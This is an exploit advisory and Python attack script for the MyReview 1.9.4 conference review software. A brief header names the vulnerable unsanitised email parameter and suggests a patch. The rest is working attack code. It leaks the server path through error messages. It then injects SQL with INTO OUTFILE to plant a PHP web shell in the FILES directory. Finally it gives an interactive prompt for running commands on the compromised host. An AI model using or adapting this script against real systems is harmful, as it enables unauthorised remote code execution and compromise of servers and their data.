MyReview 1.9.4 (email) Remote SQL Injection / Code Execution Exploit
====================================================================



# MyReview 1.9.4 SQL Injection exploit
#
#
# http://myreview.lri.fr/
#
# in functions.php starting from line 382
# ............	
#	function GetMember ($email, $db, $mode="array")
#	{
#  		$query = "SELECT * FROM PCMember WHERE email = &#039;$email&#039;" ;
#		result = $db->execRequete ($query);
# .......... 
# 
# $email is not checked before used into $query
# 
# for patch 
# 
# 1. add "$email=addslashes(trim($email));" before $query
# 2. use something else, very buggy script
#
# by STILPU (dmooray[a lu&#039;]gmail.com)
#


import httplib, urllib, re, urlparse, sys

def usage():
	print """
MyReview 1.9.4 SQL Injection exploit

Usage: python exploit.py http://target/pathtomyreview/

Requires warnings to be displayed so we cat get the localpath and FILES/ to be writable

by STILPU  (dmooray[a lu&#039;]gmail.com)

"""
	sys.exit(1)

def getlocalpath(server):
	params=urllib.urlencode({&#039;email&#039;:&#039;\&#039;&#039;,&#039;motDePasse&#039;:&#039;a&#039;,&#039;ident&#039;:&#039;Log in&#039;})
	headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	con = httplib.HTTPConnection(server)
	con.request("POST",path+"Admin.php",params,headers)
	resp=con.getresponse()
	data=resp.read()
	try:
		localpath=re.search(&#039;>/.*B&#039;,data[0:10000]).group().replace(&#039;>&#039;,&#039;&#039;,1).replace(&#039;B&#039;,&#039;&#039;,1)	
	except Exception: print "Exploit failed: didn`t manage to get localpath"; sys.exit(1)
	return localpath
	
def sendshell(server):
	shell="&#039;<?php error_reporting(0); ini_set(\"max_execution_time\",0); system($_GET[cmd]); /*&#039;"
	sql="&#039; union select " + shell + ",0,0,0,&#039;*/ ?>&#039; into outfile &#039;" +getlocalpath(server)+ "FILES/STILPU.php&#039; from PCMember#"
	headers={"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
	params=urllib.urlencode({&#039;email&#039;:sql,&#039;motDePasse&#039;:&#039;a&#039;,&#039;ident&#039;:&#039;Log in&#039;})
	con = httplib.HTTPConnection(server)
	con.request("POST",path+"Admin.php",params,headers)

def sendcmd(server):
	while 1:
		try:
			cmd=raw_input(&#039;sh$ &#039;)
			cmd=cmd.replace(" ","+")
			con = httplib.HTTPConnection(target)
			con.request("GET",path+"FILES/STILPU.php?cmd="+cmd)
			resp=con.getresponse()
			data=resp.read()
			if (cmd=="exit" or cmd=="quit"): break
			print data
		except KeyboardInterrupt: break	


if __name__ == &#039;__main__&#039;:

	if len(sys.argv) < 2:
		usage()		
	
	else:
		url = sys.argv[1]
		url = urlparse.urlsplit(url)
		target = url[1]
		path = url[2]
		
		sendshell(target)
		sendcmd(target)



